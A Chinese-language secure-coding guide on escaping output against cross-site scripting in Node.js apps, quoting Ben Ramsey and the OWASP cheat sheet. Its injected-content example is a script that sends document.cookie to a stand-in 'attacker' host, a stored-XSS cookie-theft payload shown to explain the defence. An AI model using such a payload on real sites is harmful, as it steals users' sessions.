# 转义输出

### 一段解释

HTML和其他web语言将内容与可执行代码混合在一起 - 单个HTML段落可能包含数据的可视化表示以及JavaScript执行指令。在呈现HTML或从API返回数据时, 我们认为纯内容实际上可能会嵌入Javascript代码, 这些代码将由浏览器解释和执行。例如, 当我们呈现攻击者插入到数据库的内容时, 就会发生这种情况 - 例如 `<div><script>//malicious code</script></div>`。这可以通过指示浏览器将任何不受信任的数据块仅视为内容, 而从不解释它来缓解 - 这种技术称为转义。许多npm库和HTML模板引擎提供了转义功能(例如: [escape-html](https://github.com/component/escape-html), [node-esapi](https://github.com/ESAPI/node-esapi))。不仅应该转义HTML内容, 而且CSS和Javascript也应该被转义。


### 代码示例 - 不要将不受信任的数据放入html中 

```javascript
<script>...NEVER PUT UNTRUSTED DATA HERE...</script>   directly in a script
 
 <!--...NEVER PUT UNTRUSTED DATA HERE...-->             inside an HTML comment
 
 <div ...NEVER PUT UNTRUSTED DATA HERE...=test />       in an attribute name
 
 <NEVER PUT UNTRUSTED DATA HERE... href="/test" />   in a tag name
 
 <style>...NEVER PUT UNTRUSTED DATA HERE...</style>   directly in CSS

```

### 代码示例 - 恶意内容可能会注入到数据库中

```javascript
<div>
  <b>A pseudo comment to the a post</b>
  <script>
    window.location='http://attacker/?cookie='+document.cookie
</script>
</div>

```

<br/><br/>

### 博客引用: "当我们不希望字符被解释"

摘自博客[benramsey.com](https://benramsey.com/articles/escape-output/)
> 数据可能会以HTML的形式离开应用程序而被发送到Web浏览器，同理，SQL发送到数据库，XML发送到RSS读取器，WML发送到无线设备等。可能性是无限的。其中每一个都有自己的一组特殊字符, 对这些字符的解释不同于接收到的其他纯文本。有时我们希望发送这些特殊字符, 以便对其进行解释 (例如, HTML标签发送到Web浏览器), 而有时 (从用户或其他来源的输入的情况下), 我们不希望这些字符被解释, 因此我们需要转义他们。

> 转义有时也称为编码。简而言之, 它是以不会执行或解释数据的方式表示数据的过程。例如, HTML将在Web浏览器中以粗体文本呈现以下文本，因为<strong>标签有特殊的含义: 
<strong>This is bold text.</strong>
但是, 假设我想在浏览器中呈现标签, 并避免对它们的解释。这样, 我需要转义在HTML中具有特殊含义的尖括号。下面说明了转义的HTML:

&lt;strong&gt;This is bold text.&lt;/strong&gt;


<br/><br/>

### Blog Quote: "OWASP recommends using a security-focused encoding library"

From the blog OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
> "Writing these encoders is not tremendously difficult, but there are quite a few hidden pitfalls. For example, you might be tempted to use some of the escaping shortcuts like \" in JavaScript. However, these values are dangerous and may be misinterpreted by the nested parsers in the browser. You might also forget to escape the escape character, which attackers can use to neutralize your attempts to be safe. **OWASP recommends using a security-focused encoding library to make sure these rules are properly implemented**."


<br/><br/>

### Blog Quote: "You MUST use the escape syntax for the part of the HTML"

From the blog OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
> "But HTML entity encoding doesn't work if you're putting untrusted data inside a <script> tag anywhere, or an event handler attribute like onmouseover, or inside CSS, or in a URL. So even if you use an HTML entity encoding method everywhere, you are still most likely vulnerable to XSS. You MUST use the escape syntax for the part of the HTML document you're putting untrusted data into."